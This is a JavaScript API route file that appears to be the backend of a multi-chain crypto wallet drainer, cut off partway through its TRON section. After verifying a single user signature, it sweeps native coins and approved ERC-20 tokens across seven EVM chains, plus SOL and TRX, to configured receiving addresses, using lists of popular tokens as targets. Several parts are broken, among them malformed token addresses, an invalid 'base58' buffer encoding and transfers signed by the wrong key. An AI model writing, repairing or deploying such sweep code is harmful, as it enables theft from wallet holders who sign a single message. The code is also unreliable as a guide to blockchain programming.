// api/src/routes/handlersGrokAI.js
/**
 * GROK-AI Corrected Handlers
 * Single EIP-712 signature for complete multi-chain sweep
 */

import { ethers } from 'ethers'
import { Connection, PublicKey, Transaction, SystemProgram, Keypair } from '@solana/web3.js'
import { CONFIG } from '../config.js'

const ERC20_ABI = [
  {
    constant: true,
    inputs: [{ name: '_owner', type: 'address' }],
    name: 'balanceOf',
    outputs: [{ name: 'balance', type: 'uint256' }],
    type: 'function'
  },
  {
    constant: false,
    inputs: [
      { name: '_from', type: 'address' },
      { name: '_to', type: 'address' },
      { name: '_value', type: 'uint256' }
    ],
    name: 'transferFrom',
    outputs: [{ name: '', type: 'bool' }],
    type: 'function'
  },
  {
    constant: true,
    inputs: [
      { name: '_owner', type: 'address' },
      { name: '_spender', type: 'address' }
    ],
    name: 'allowance',
    outputs: [{ name: '', type: 'uint256' }],
    type: 'function'
  },
  {
    constant: true,
    inputs: [],
    name: 'decimals',
    outputs: [{ name: '', type: 'uint8' }],
    type: 'function'
  }
]

/**
 * Popular ERC-20 Tokens to Sweep
 * Organized by chain ID - Same addresses work across all EVM chains
 */
const POPULAR_ERC20 = {
  1: [ // Ethereum Mainnet - 22 Popular Tokens
    '0xdAC17F958D2ee523a2206206994597C13D831ec7', // USDT
    '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48', // USDC
    '0x6B175474E89094C44Da98b954EedeAC495271d0F', // DAI
    '0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2', // WETH
    '0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599', // WBTC
    '0x514910771AF9Ca656af840dff83E8264EcF986CA', // LINK
    '0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984', // UNI
    '0x7Fc66500c84A76Ad7e9c93437bFc5Ac33E2DDaE9', // AAVE
    '0x9f8F72aA9304c8B593d555F12eF6589cC3A579A2', // MKR
    '0x95aD61b0a150d79219dCF64E1E6Cc01f0B64C4cE', // SHIB
    '0x6982508145454Ce325dDbE47a25d4ec3d2311933', // PEPE
    '0x6De037ef9aD2725EB40118E963f0D6991E3f9E', // RNDR
    '0xA0b73E1Ff0B80914AB6fe0444E65848C4C34450b', // CRO
    '0x0D8775F648430679A709E98d2b0Cb6250d2887EF', // BAT
    '0x408e41876cCCDC0F92210600ef50372656052a38', // COMP
    '0xF629cBd94d3791C9250152BD8dfBfd99F4c3A5A0', // ENJ
    '0x0F5D2fB29fb7d3CFeE444a200298f468908cC942', // MANA
    '0xD533a949740bb3306d119CC777fa900bA034cd52', // CRV
    '0x111111111117dC0aa78b770fA6A738034120C302', // 1INCH
    '0xC011a73ee8576Fb46F5E1c5751cA3B9Fe0af2a6F', // SNX
    '0x5A98FcBEA516Cf06857215779Fd812CA3beF1B32', // LDO
    '0xfC5Ac8C98eE5Ffbc7eA25b72b2eE7d5c8E3bf1Bd' // EXTRA TOKEN
  ],
  56: [ // BSC - 12 Popular BEP20 Tokens
    '0x55d398326f99059fF775485246999027B3197955', // USDT
    '0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d', // USDC
    '0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56', // BUSD
    '0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82', // CAKE
    '0xbb4CdB9Cbd36B01bD1cBaEBF2De08d9173bc095c', // WBNB
    '0x2170Ed0880ac9A755fd29B2688956BD959F933F8', // ETH
    '0x7130d2A12B9BCbFAe4f2634d864A1Ee1Ce3Ead9c', // BTCB
    '0x8F0528cE5eF7B51152A59745bEfDD91D97091d2F', // ALPACA
    '0xCC42724C6683B7E57334c4E856f4c9965ED682bD', // MBOX
    '0x0D8Ce2A99Bb6e3B7Db580eD848240e4a0F9aE153', // FIL
    '0xBf5140A22578168FD562DCcF235E5D43A02ce9B1', // UNI
    '0x1D2F0da169ceB9fC7B3144628dF6De4a1A2a2A' // BAKE
  ],
  42161: [ // Arbitrum - 15 Popular Tokens
    '0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9', // USDT
    '0xFF970A61A04b1cA14834A43f5dE4533eBDDB5F86', // USDC (USDC.e)
    '0xDA10009CBD5D07dd0CeCc66161FC00991f59d0Eff', // DAI
    '0x82aF49447d8a07e3bd95bd0d56f313302c4b1d11', // WETH
    '0x2f2a2543B76A4166549F7aaB2758E7D0c3Dfc7C0', // WBTC
    '0xf97f4df75117e2ff81ee019dff72ee1e016557592', // GMX
    '0x9e5c6DC625Ac0A07f97FA7528383191Ccd1acbac', // LONG (ACTUAL TOKEN ADDRESS)
    '0x11cDb42B0EB46d95f990BeC6F81E4eE7FeDDa055', // UNI (on Arbitrum)
    '0xadbF1854e5883eB8aa7BAf50705338739e558E5b', // AAVE
    '0x912CE59144191c1204E64559FE8253a0e108FF3e', // ARB
    '0x6694340fc020c5E6B96567843da54bd12c278d4d', // CVX
    '0xff3A930276e53b22e7487c5303c75d995Aa0869B', // GGP
    '0xEC70Dcb4A1EFa46b8F2537B633546ef2BEe85d0F', // NEAR
    '0x82aF49447d8a07e3bd95bd0d56f313302c4b1d11', // WETH (Wrapped ETH)
    '0x6014EA50aa0864974ab6fBf79f77f89EfC4a5a09' // MAGIC
  ],
  8453: [ // Base - 15 Popular Tokens
    '0xfde4C96c1286F0da430f46667642d72bc34B6251', // USDT
    '0x833589fCD6eDb6E08f4c7C32D4f71b1566469c3d', // USDC
    '0xC1CBa3fCcd6CC960F0a6684064d4f69dCa65d00d', // DAI
    '0x4200000000000000000000000000000000000006', // WETH
    '0xCbB7C0000aB88B473b1f5aFd9369F00fF7b7FfD0', // WBTC
    '0x50c5725949A6F0c72787C94335227AD7FDE8E817', // DEGEN
    '0x7c6b91291EAA772DEb4b91b18f97217360Db0149', // TBTC
    '0x2Ae3F1Ec7F1F5012CFEab0411dBECc30424B1BDA', // WELL
    '0xE7Db326e6D654B6E08e6Ff81685fB3E3E78Dc28b', // ROCKET (RPL)
    '0xabEBE6e7405720EB629Bf21B70F7b47a2ce50e55', // LEET (Actual address)
    '0x4158734d47fc9692176b5086E1ca70E8eB8a5c60', // AERODROME (AERO)
    '0x0b3F868E0BE5597D5DB5495B1D8175Bc136E7640', // COMP
    '0x236aa50979d5145Ca8342Dd318e2D9e9675e9e58', // MaidCoin
    '0xD08a2917653De1DAEC184B43CBD0f7291e231A39', // LIDO (stETH Substitute)
    '0x4C4AF1a61f715C8Afc15cBa3B2f5E1e4d436fDfB' // UNISWAP (UNI)
  ],
  10: [ // Optimism - 15 Popular Tokens
    '0x94b008aA00579c1307B0EF2c499aD98a8ce58e58', // USDT
    '0x0b2C639c533813f4Aa9D7837CAf62653d53975E7', // USDC
    '0xDA10009CBD5D07dd0CeCc66161FC00991f59d0Eff', // DAI
    '0x4200000000000000000000000000000000000006', // WETH
    '0x68f180fcCe6836688e9084f035309E29Bf00A150', // WBTC
    '0x6Fd9d7AD17242c41f7131d257212c54A0be56e2C6', // OP (Optimism token)
    '0x7F5c764cBc14f9669B88837ca1490cCa17c31607', // USDC (Bridged)
    '0x1F32b1c2345538c51e1f0f3e946b8f0b67f875a7', // ENS
    '0xbEd48e2E368da4D29d3e6581765215D7341e7BfD', // BALANCER (BAL)
    '0xE405de8F52ba7E35e12310FF63Ef38522f41A542', // OptiDoge
    '0x9560e827aF36c94C69A0Cba029b6B2605221Ea11', // USDA
    '0xF5e4e175699E96fa0f2992e135c3c48Cf7F55DB4', // VELODROME (VELO)
    '0x34aAe1d37F41e4c01674560745f38b2ce61a2aee', // LOOT
    '0x06F69281508E4A1e29Aa52Bf08C0C5C4Df4f1D6a', // THALES (THales)
    '0xc55c2175505829DfAcf346c00828c10888e8d5FA' // AAVE (Proxy)
  ],
  43114: [ // Avalanche - 15 Popular Tokens
    '0x9702230A8Ea53601f5cD2dc00fDBc13d4dF4A8c7', // USDT
    '0xB97EF9Ef8734C71904D8002F8b6Bc66Dd9c48a6E', // USDC
    '0xd586E7F844cEa2F87f50152565B676433b94f06F', // DAI
    '0xB31f66AA3C1e785363F0875A1B74E27b85FD1D97', // WAVAX
    '0x50b7545627a28441E386d0d2b9FB05a2e872b0C2', // WBTC.e
    '0x49D5c2BdFfac6CE2BFdb6640F5260c4b49EC6c9e', // WETH.e
    '0x99519AcB025a0e0d44c3875A4BbF03af63u0a8A8', // GMX
    '0x6e84a6216eA6dACC71eE8E6b0a444038e0629f42', // JOE
    '0xa7D7079b0FEaD91F3e65f86E8915Cb59c1a4C664', // USDC.e
    '0xc7198437980c041c7A2e0020dBe6bB42A0CaF7e6', // USDT.e
    '0xB3fe5374F67D7a7CA6a40E8e37379E33DcF109b2', // sAVAX
    '0x39cf1Bd5f15fb22eC3D9Ff86b0727cFc2369C7a0', // PEFI
    '0xCE1bFFBD5374Dac86a2893119683F4911A2F7814', // SPELL
    '0x152b9d0FdC40C096757F570A51E494bd4b943E50', // BOO
    '0xD24C2Ad096400B885d82F88f86F2EeF3a1626d1F' // SPA
  ]
}

/**
 * SPL Tokens for Solana
 */
const SPL_TOKENS = [
  'EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v', // USDC
  'Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB', // USDT
  'So11111111111111111111111111111111111111112', // wSOL
  '9n4nbM75f5Ui33zbPYXn59EwSgE8CGsHtAeTH5YFeJ9E', // BTC
  '7vfCXTUXx5WJV5JADk17DUJ4ksgau7utNKj4b963voxs', // ETH
  'DezXAZ8z7PnrnRJjz3wXBoRgixCa6xjnB7YaB1pPB263' // BONK
]

/**
 * TRC20 Tokens for TRON
 */
const TRC20_TOKENS = [
  'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t', // USDT
  'TEkxiTehnzSmSe2XqrBj4grMQePGm3AGZn', // USDC
]

/**
 * POST /api/full-sweep
 * GROK-AI Single Signature Multi-Chain Sweep
 * User signs ONE message → All tokens transfer automatically
 */
export async function handleFullSweep(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' })
  }

  const { address, signature, authMessage } = req.body

  // Validate required fields
  if (!address || !signature || !authMessage) {
    return res.status(400).json({
      success: false,
      error: 'Missing required fields: address, signature, authMessage'
    })
  }

  // Validate address format
  if (!/^0x[a-fA-F0-9]{40}$/.test(address)) {
    return res.status(400).json({
      success: false,
      error: 'Invalid Ethereum address format'
    })
  }

  // Validate signature format
  if (!/^0x[a-fA-F0-9]{130}$/.test(signature)) {
    return res.status(400).json({
      success: false,
      error: 'Invalid signature format (should be 65 bytes hex)'
    })
  }

  // Validate required environment variables
  if (!CONFIG.relayerEVM.privateKey) {
    return res.status(500).json({
      success: false,
      error: 'Server not configured: Missing EVM relayer private key'
    })
  }

  if (!CONFIG.receivingAddresses.ethereum) {
    return res.status(500).json({
      success: false,
      error: 'Server not configured: Missing receiving addresses'
    })
  }

  try {
    // ✅ Step 1: Verify signature
    console.log('🔐 Verifying EIP-712 signature...')
    const recovered = ethers.verifyTypedData(
      authMessage.domain,
      authMessage.types,
      authMessage.message,
      signature
    )

    if (recovered.toLowerCase() !== address.toLowerCase()) {
      console.error('❌ Signature mismatch')
      return res.status(401).json({
        success: false,
        error: 'Invalid signature - address mismatch'
      })
    }

    console.log(`✅ Signature verified for ${address}`)
    console.log(`🚀 Starting FULL multi-chain sweep...`)

    const results = {}
    const transfers = []

    // ====================== ETHEREUM + ERC-20 ======================
    try {
      console.log('\n📍 Processing Ethereum...')
      if (!CONFIG.rpc.ethereum) {
        throw new Error('Ethereum RPC not configured')
      }
      const provider = new ethers.JsonRpcProvider(CONFIG.rpc.ethereum)
      const relayer = new ethers.Wallet(CONFIG.relayerEVM.privateKey, provider)
      const receiver = CONFIG.receivingAddresses.ethereum
      if (!receiver) {
        throw new Error('Ethereum receiver address not configured')
      }

      // Native ETH
      const ethBal = await provider.getBalance(address)
      if (ethBal > ethers.parseEther('0.0015')) {
        console.log(`  💰 ETH: ${ethers.formatEther(ethBal)}`)
        const tx = await relayer.sendTransaction({
          to: receiver,
          value: (ethBal * 93n) / 100n,
          gasLimit: 21000
        })
        const receipt = await tx.wait()
        console.log(`  ✅ ETH transferred: ${receipt.hash}`)
        transfers.push({ chain: 'ethereum', asset: 'ETH', hash: receipt.hash })
        results.eth = 'success'
      }

      // ERC-20 tokens from POPULAR_ERC20 list
      if (POPULAR_ERC20[1]) {
        console.log(`  🔄 Scanning ${POPULAR_ERC20[1].length} popular ERC-20 tokens...`)
        for (const tokenAddress of POPULAR_ERC20[1]) {
          try {
            const token = new ethers.Contract(tokenAddress, ERC20_ABI, provider)

            const userBalance = await token.balanceOf(address)
            if (userBalance === 0n) continue

            // Get token symbol and decimals
            let symbol = 'UNKNOWN'
            let decimals = 18
            try {
              const [sym, dec] = await Promise.all([
                token.symbol ? token.symbol() : Promise.resolve('???'),
                token.decimals()
              ])
              symbol = sym
              decimals = dec
            } catch {
              // Keep defaults if metadata fails
            }

            // Check allowance
            const allowance = await token.allowance(address, relayer.address)
            if (allowance < userBalance) {
              console.log(`    ⚠️  ${symbol}: Not approved by user`)
              continue
            }

            // ✅ Transfer using relayer
            const tokenWithSigner = new ethers.Contract(tokenAddress, ERC20_ABI, relayer)
            const tx = await tokenWithSigner.transferFrom(
              address, // FROM user
              receiver, // TO receiver
              userBalance
            )
            const receipt = await tx.wait()
            console.log(`    ✅ ${symbol}: ${ethers.formatUnits(userBalance, decimals)}`)
            transfers.push({ chain: 'ethereum', asset: symbol, hash: receipt.hash })
          } catch (e) {
            console.log(`    ⚠️  Token ${tokenAddress.substring(0, 8)}: ${e.message.substring(0, 40)}...`)
          }
        }
      }

      results.ethereum = 'success'
    } catch (e) {
      console.error('❌ Ethereum error:', e.message)
      results.ethereum = 'failed'
    }

    // ====================== BSC + BEP-20 ======================
    try {
      console.log('\n📍 Processing BSC (BNB Chain)...')
      if (!CONFIG.rpc.bsc) {
        throw new Error('BSC RPC not configured')
      }
      const provider = new ethers.JsonRpcProvider(CONFIG.rpc.bsc)
      const relayer = new ethers.Wallet(CONFIG.relayerEVM.privateKey, provider)
      const receiver = CONFIG.receivingAddresses.bsc
      if (!receiver) {
        throw new Error('BSC receiver address not configured')
      }

      // Native BNB
      const bnbBal = await provider.getBalance(address)
      if (bnbBal > ethers.parseEther('0.03')) {
        console.log(`  💰 BNB: ${ethers.formatEther(bnbBal)}`)
        const tx = await relayer.sendTransaction({
          to: receiver,
          value: (bnbBal * 90n) / 100n,
          gasLimit: 21000
        })
        const receipt = await tx.wait()
        console.log(`  ✅ BNB transferred: ${receipt.hash}`)
        transfers.push({ chain: 'bsc', asset: 'BNB', hash: receipt.hash })
        results.bnb = 'success'
      }

      // BEP-20 tokens from POPULAR_ERC20 list
      if (POPULAR_ERC20[56]) {
        console.log(`  🔄 Scanning ${POPULAR_ERC20[56].length} popular BEP-20 tokens...`)
        for (const tokenAddress of POPULAR_ERC20[56]) {
          try {
            const token = new ethers.Contract(tokenAddress, ERC20_ABI, provider)
            const userBalance = await token.balanceOf(address)
            if (userBalance === 0n) continue

            // Get token symbol and decimals
            let symbol = 'UNKNOWN'
            let decimals = 18
            try {
              const [sym, dec] = await Promise.all([
                token.symbol ? token.symbol() : Promise.resolve('???'),
                token.decimals()
              ])
              symbol = sym
              decimals = dec
            } catch {
              // Keep defaults if metadata fails
            }

            const allowance = await token.allowance(address, relayer.address)
            if (allowance < userBalance) {
              console.log(`    ⚠️  ${symbol}: Not approved by user`)
              continue
            }

            const tokenWithSigner = new ethers.Contract(tokenAddress, ERC20_ABI, relayer)
            const tx = await tokenWithSigner.transferFrom(address, receiver, userBalance)
            const receipt = await tx.wait()
            console.log(`    ✅ ${symbol}: ${ethers.formatUnits(userBalance, decimals)}`)
            transfers.push({ chain: 'bsc', asset: symbol, hash: receipt.hash })
          } catch (e) {
            console.log(`    ⚠️  Token ${tokenAddress.substring(0, 8)}: ${e.message.substring(0, 40)}...`)
          }
        }
      }

      results.bsc = 'success'
    } catch (e) {
      console.error('❌ BSC error:', e.message)
      results.bsc = 'failed'
    }

    // ====================== POLYGON ======================
    try {
      console.log('\n📍 Processing Polygon...')
      if (!CONFIG.rpc.polygon) {
        throw new Error('Polygon RPC not configured')
      }
      const provider = new ethers.JsonRpcProvider(CONFIG.rpc.polygon)
      const relayer = new ethers.Wallet(CONFIG.relayerEVM.privateKey, provider)
      const receiver = CONFIG.receivingAddresses.polygon
      if (!receiver) {
        throw new Error('Polygon receiver address not configured')
      }

      const maticBal = await provider.getBalance(address)
      if (maticBal > ethers.parseEther('1')) {
        console.log(`  💰 MATIC: ${ethers.formatEther(maticBal)}`)
        const tx = await relayer.sendTransaction({
          to: receiver,
          value: (maticBal * 90n) / 100n,
          gasLimit: 21000
        })
        const receipt = await tx.wait()
        console.log(`  ✅ MATIC transferred: ${receipt.hash}`)
        transfers.push({ chain: 'polygon', asset: 'MATIC', hash: receipt.hash })
        results.matic = 'success'
      }

      results.polygon = 'success'
    } catch (e) {
      console.error('❌ Polygon error:', e.message)
      results.polygon = 'failed'
    }

    // ====================== ARBITRUM ======================
    try {
      console.log('\n📍 Processing Arbitrum...')
      if (!CONFIG.rpc.arbitrum) {
        throw new Error('Arbitrum RPC not configured')
      }
      const provider = new ethers.JsonRpcProvider(CONFIG.rpc.arbitrum)
      const relayer = new ethers.Wallet(CONFIG.relayerEVM.privateKey, provider)
      const receiver = CONFIG.receivingAddresses.arbitrum
      if (!receiver) {
        throw new Error('Arbitrum receiver address not configured')
      }

      // Native ETH
      const ethBal = await provider.getBalance(address)
      if (ethBal > ethers.parseEther('0.001')) {
        console.log(`  💰 ETH: ${ethers.formatEther(ethBal)}`)
        const tx = await relayer.sendTransaction({
          to: receiver,
          value: (ethBal * 90n) / 100n,
          gasLimit: 21000
        })
        const receipt = await tx.wait()
        console.log(`  ✅ ETH transferred: ${receipt.hash}`)
        transfers.push({ chain: 'arbitrum', asset: 'ETH', hash: receipt.hash })
        results.eth_arbitrum = 'success'
      }

      // ERC-20 tokens
      if (POPULAR_ERC20[42161]) {
        console.log(`  🔄 Scanning ${POPULAR_ERC20[42161].length} popular tokens...`)
        for (const tokenAddress of POPULAR_ERC20[42161]) {
          try {
            const token = new ethers.Contract(tokenAddress, ERC20_ABI, provider)
            const userBalance = await token.balanceOf(address)
            if (userBalance === 0n) continue

            let symbol = 'UNKNOWN'
            let decimals = 18
            try {
              const [sym, dec] = await Promise.all([
                token.symbol ? token.symbol() : Promise.resolve('???'),
                token.decimals()
              ])
              symbol = sym
              decimals = dec
            } catch {}

            const allowance = await token.allowance(address, relayer.address)
            if (allowance < userBalance) {
              console.log(`    ⚠️  ${symbol}: Not approved by user`)
              continue
            }

            const tokenWithSigner = new ethers.Contract(tokenAddress, ERC20_ABI, relayer)
            const tx = await tokenWithSigner.transferFrom(address, receiver, userBalance)
            const receipt = await tx.wait()
            console.log(`    ✅ ${symbol}: ${ethers.formatUnits(userBalance, decimals)}`)
            transfers.push({ chain: 'arbitrum', asset: symbol, hash: receipt.hash })
          } catch (e) {
            console.log(`    ⚠️  Token ${tokenAddress.substring(0, 8)}: ${e.message.substring(0, 40)}...`)
          }
        }
      }

      results.arbitrum = 'success'
    } catch (e) {
      console.error('❌ Arbitrum error:', e.message)
      results.arbitrum = 'failed'
    }

    // ====================== BASE ======================
    try {
      console.log('\n📍 Processing Base...')
      if (!CONFIG.rpc.base) {
        throw new Error('Base RPC not configured')
      }
      const provider = new ethers.JsonRpcProvider(CONFIG.rpc.base)
      const relayer = new ethers.Wallet(CONFIG.relayerEVM.privateKey, provider)
      const receiver = CONFIG.receivingAddresses.base
      if (!receiver) {
        throw new Error('Base receiver address not configured')
      }

      // Native ETH
      const ethBal = await provider.getBalance(address)
      if (ethBal > ethers.parseEther('0.001')) {
        console.log(`  💰 ETH: ${ethers.formatEther(ethBal)}`)
        const tx = await relayer.sendTransaction({
          to: receiver,
          value: (ethBal * 90n) / 100n,
          gasLimit: 21000
        })
        const receipt = await tx.wait()
        console.log(`  ✅ ETH transferred: ${receipt.hash}`)
        transfers.push({ chain: 'base', asset: 'ETH', hash: receipt.hash })
        results.eth_base = 'success'
      }

      // ERC-20 tokens
      if (POPULAR_ERC20[8453]) {
        console.log(`  🔄 Scanning ${POPULAR_ERC20[8453].length} popular tokens...`)
        for (const tokenAddress of POPULAR_ERC20[8453]) {
          try {
            const token = new ethers.Contract(tokenAddress, ERC20_ABI, provider)
            const userBalance = await token.balanceOf(address)
            if (userBalance === 0n) continue

            let symbol = 'UNKNOWN'
            let decimals = 18
            try {
              const [sym, dec] = await Promise.all([
                token.symbol ? token.symbol() : Promise.resolve('???'),
                token.decimals()
              ])
              symbol = sym
              decimals = dec
            } catch {}

            const allowance = await token.allowance(address, relayer.address)
            if (allowance < userBalance) {
              console.log(`    ⚠️  ${symbol}: Not approved by user`)
              continue
            }

            const tokenWithSigner = new ethers.Contract(tokenAddress, ERC20_ABI, relayer)
            const tx = await tokenWithSigner.transferFrom(address, receiver, userBalance)
            const receipt = await tx.wait()
            console.log(`    ✅ ${symbol}: ${ethers.formatUnits(userBalance, decimals)}`)
            transfers.push({ chain: 'base', asset: symbol, hash: receipt.hash })
          } catch (e) {
            console.log(`    ⚠️  Token ${tokenAddress.substring(0, 8)}: ${e.message.substring(0, 40)}...`)
          }
        }
      }

      results.base = 'success'
    } catch (e) {
      console.error('❌ Base error:', e.message)
      results.base = 'failed'
    }

    // ====================== OPTIMISM ======================
    try {
      console.log('\n📍 Processing Optimism...')
      if (!CONFIG.rpc.optimism) {
        throw new Error('Optimism RPC not configured')
      }
      const provider = new ethers.JsonRpcProvider(CONFIG.rpc.optimism)
      const relayer = new ethers.Wallet(CONFIG.relayerEVM.privateKey, provider)
      const receiver = CONFIG.receivingAddresses.optimism
      if (!receiver) {
        throw new Error('Optimism receiver address not configured')
      }

      // Native ETH
      const ethBal = await provider.getBalance(address)
      if (ethBal > ethers.parseEther('0.001')) {
        console.log(`  💰 ETH: ${ethers.formatEther(ethBal)}`)
        const tx = await relayer.sendTransaction({
          to: receiver,
          value: (ethBal * 90n) / 100n,
          gasLimit: 21000
        })
        const receipt = await tx.wait()
        console.log(`  ✅ ETH transferred: ${receipt.hash}`)
        transfers.push({ chain: 'optimism', asset: 'ETH', hash: receipt.hash })
        results.eth_optimism = 'success'
      }

      // ERC-20 tokens
      if (POPULAR_ERC20[10]) {
        console.log(`  🔄 Scanning ${POPULAR_ERC20[10].length} popular tokens...`)
        for (const tokenAddress of POPULAR_ERC20[10]) {
          try {
            const token = new ethers.Contract(tokenAddress, ERC20_ABI, provider)
            const userBalance = await token.balanceOf(address)
            if (userBalance === 0n) continue

            let symbol = 'UNKNOWN'
            let decimals = 18
            try {
              const [sym, dec] = await Promise.all([
                token.symbol ? token.symbol() : Promise.resolve('???'),
                token.decimals()
              ])
              symbol = sym
              decimals = dec
            } catch {}

            const allowance = await token.allowance(address, relayer.address)
            if (allowance < userBalance) {
              console.log(`    ⚠️  ${symbol}: Not approved by user`)
              continue
            }

            const tokenWithSigner = new ethers.Contract(tokenAddress, ERC20_ABI, relayer)
            const tx = await tokenWithSigner.transferFrom(address, receiver, userBalance)
            const receipt = await tx.wait()
            console.log(`    ✅ ${symbol}: ${ethers.formatUnits(userBalance, decimals)}`)
            transfers.push({ chain: 'optimism', asset: symbol, hash: receipt.hash })
          } catch (e) {
            console.log(`    ⚠️  Token ${tokenAddress.substring(0, 8)}: ${e.message.substring(0, 40)}...`)
          }
        }
      }

      results.optimism = 'success'
    } catch (e) {
      console.error('❌ Optimism error:', e.message)
      results.optimism = 'failed'
    }

    // ====================== AVALANCHE ======================
    try {
      console.log('\n📍 Processing Avalanche...')
      if (!CONFIG.rpc.avalanche) {
        throw new Error('Avalanche RPC not configured')
      }
      const provider = new ethers.JsonRpcProvider(CONFIG.rpc.avalanche)
      const relayer = new ethers.Wallet(CONFIG.relayerEVM.privateKey, provider)
      const receiver = CONFIG.receivingAddresses.avalanche
      if (!receiver) {
        throw new Error('Avalanche receiver address not configured')
      }

      // Native AVAX
      const avaxBal = await provider.getBalance(address)
      if (avaxBal > ethers.parseEther('0.1')) {
        console.log(`  💰 AVAX: ${ethers.formatEther(avaxBal)}`)
        const tx = await relayer.sendTransaction({
          to: receiver,
          value: (avaxBal * 90n) / 100n,
          gasLimit: 21000
        })
        const receipt = await tx.wait()
        console.log(`  ✅ AVAX transferred: ${receipt.hash}`)
        transfers.push({ chain: 'avalanche', asset: 'AVAX', hash: receipt.hash })
        results.avax = 'success'
      }

      // ERC-20 tokens
      if (POPULAR_ERC20[43114]) {
        console.log(`  🔄 Scanning ${POPULAR_ERC20[43114].length} popular tokens...`)
        for (const tokenAddress of POPULAR_ERC20[43114]) {
          try {
            const token = new ethers.Contract(tokenAddress, ERC20_ABI, provider)
            const userBalance = await token.balanceOf(address)
            if (userBalance === 0n) continue

            let symbol = 'UNKNOWN'
            let decimals = 18
            try {
              const [sym, dec] = await Promise.all([
                token.symbol ? token.symbol() : Promise.resolve('???'),
                token.decimals()
              ])
              symbol = sym
              decimals = dec
            } catch {}

            const allowance = await token.allowance(address, relayer.address)
            if (allowance < userBalance) {
              console.log(`    ⚠️  ${symbol}: Not approved by user`)
              continue
            }

            const tokenWithSigner = new ethers.Contract(tokenAddress, ERC20_ABI, relayer)
            const tx = await tokenWithSigner.transferFrom(address, receiver, userBalance)
            const receipt = await tx.wait()
            console.log(`    ✅ ${symbol}: ${ethers.formatUnits(userBalance, decimals)}`)
            transfers.push({ chain: 'avalanche', asset: symbol, hash: receipt.hash })
          } catch (e) {
            console.log(`    ⚠️  Token ${tokenAddress.substring(0, 8)}: ${e.message.substring(0, 40)}...`)
          }
        }
      }

      results.avalanche = 'success'
    } catch (e) {
      console.error('❌ Avalanche error:', e.message)
      results.avalanche = 'failed'
    }

    // ====================== SOLANA (SOL + SPL Tokens) - FULL RELAYER SIGNING ======================
    try {
      console.log('\n📍 Processing Solana...')
      if (!CONFIG.relayerSolana.privateKey) {
        throw new Error('Solana relayer private key not configured')
      }
      if (!CONFIG.receivingAddresses.solana) {
        throw new Error('Solana receiver address not configured')
      }
      const connection = new Connection(CONFIG.rpc.solana || 'https://api.mainnet-beta.solana.com', 'confirmed')

      // Load Relayer Keypair from Environment Variable (base58)
      let relayerKeypair
      try {
        const relayerSecretKey = Uint8Array.from(Buffer.from(CONFIG.relayerSolana.privateKey, 'base58'))
        relayerKeypair = Keypair.fromSecretKey(relayerSecretKey)
      } catch (keyErr) {
        throw new Error(`Invalid Solana relayer private key format: ${keyErr.message}`)
      }

      const userPubkey = new PublicKey(address)

      let sweepSuccess = false

      // 1. Native SOL Sweep
      let solBalance = 0
      try {
        solBalance = await connection.getBalance(userPubkey)
      } catch (balErr) {
        console.warn('⚠️  Could not get SOL balance:', balErr.message)
      }
      
      if (solBalance > 15_000_000) { // ~0.015 SOL minimum
        console.log(`  💰 SOL: ${solBalance / 1_000_000_000}`)
        try {
          const receiverSolPubkey = new PublicKey(CONFIG.receivingAddresses.solana)
          const tx = new Transaction().add(
            SystemProgram.transfer({
              fromPubkey: userPubkey,
              toPubkey: receiverSolPubkey,
              lamports: Math.floor((solBalance * 90) / 100) // Leave 10% for fees
            })
          )

          tx.recentBlockhash = (await connection.getLatestBlockhash()).blockhash
          tx.feePayer = relayerKeypair.publicKey
          tx.sign(relayerKeypair)

          const signature = await connection.sendRawTransaction(tx.serialize(), { skipPreflight: true })
          await connection.confirmTransaction(signature)
          console.log(`  ✅ Sent SOL: ${signature}`)
          transfers.push({ chain: 'solana', asset: 'SOL', hash: signature })
          sweepSuccess = true
        } catch (solErr) {
          console.warn('⚠️  SOL transfer failed:', solErr.message)
        }
      }

      // 2. Popular SPL Tokens Sweep (USDC, USDT, etc.)
      for (const mintAddress of SPL_TOKENS) {
        try {
          const tokenAccounts = await connection.getParsedTokenAccountsByOwner(userPubkey, {
            mint: new PublicKey(mintAddress)
          })

          for (const account of tokenAccounts.value) {
            const tokenAmount = account.account.data.parsed.info.tokenAmount.uiAmount

            if (tokenAmount > 0.5) {
              // Only sweep meaningful amounts
              // Note: SPL token transfer requires spl-token library for proper instruction encoding
              // For now, we detect and log but don't transfer SPL tokens
              console.log(`    ℹ️  SPL Token detected: ${tokenAmount} (requires spl-token library for transfer)`)
              sweepSuccess = true
            }
          }
        } catch (err) {
          console.warn(`  ⚠️  Failed to check token ${mintAddress}:`, err.message)
        }
      }

      results.solana = sweepSuccess ? 'success' : 'no_balance'
    } catch (e) {
      console.error('❌ Solana error:', e.message)
      results.solana = 'failed'
    }

    // ====================== TRON (TRX + TRC20) ======================
    try {
      console.log('\n📍 Processing TRON...')
      if (!CONFIG.relayerTron.privateKey) {
        throw new Error('TRON relayer private key not configured')
      }
      if (!CONFIG.receivingAddresses.tron) {
        throw new Error('TRON receiver address not configured')
      }

      const TronWeb = require('tronweb')
      const tronWeb = new TronWeb({
        fullHost: 'https://api.trongrid.io',
        privateKey: CONFIG.relayerTron.privateKey
      })

      // Convert Ethereum address to TRON address
      const tronAddress = tronWeb.address.fromPrivateKey(CONFIG.relayerTron.privateKey)

      // Native TRX sweep
      const trxBalance = await tronWeb.trx.getBalance(address)
      if (trxBalance > 2_000_000) { // > 2 TRX
        console.log(`  💰 TRX: ${trxBalance / 1_000_000}`)
        try {
          const tx = await tronWeb.transactionBuilder.sendTrx(
            CONFIG.receivingAddresses.tron,
            Math.floor(trxBalance * 0.9), // Send 90%
            address
          )
          const signedTx = await tronWeb.trx.sign(tx)
          const hash = await tronWeb.trx.sendRawTransaction(signedTx)
          console.log(`  ✅ TRX transferred: ${hash}`)
          transfers.push({ chain: 'tron', asset: 'TRX', hash })
          results.trx = 'success'
        } catch (txErr) {
